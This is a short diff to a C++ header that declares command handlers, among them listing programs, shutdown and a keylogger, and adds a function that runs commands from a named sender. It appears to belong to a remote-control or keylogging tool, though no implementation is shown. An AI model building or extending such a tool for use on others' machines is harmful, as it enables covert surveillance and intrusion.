@@ -25,3 +25,5 @@ void handle_list_programs();
 void handle_shutdown();
 
 void handle_keylogger(const std::string& command);
+
+void execute_command_with_sender(const string& sender, const string& command);
